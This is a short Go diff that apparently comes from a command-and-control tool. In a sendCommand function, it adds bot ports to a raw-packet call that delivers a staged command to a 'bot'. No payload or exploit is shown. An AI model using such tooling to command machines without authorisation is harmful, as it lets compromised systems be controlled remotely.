@@ -52,7 +52,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			fmt.Println("DST MAC:", dstMAC)
 			fmt.Println("SRC IP:", myIP)
 			fmt.Println("DST IP:", bot.RespIP)
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, dstMAC, cattails.CreateCommand(stagedCmd))
+			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
 			// YEET
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
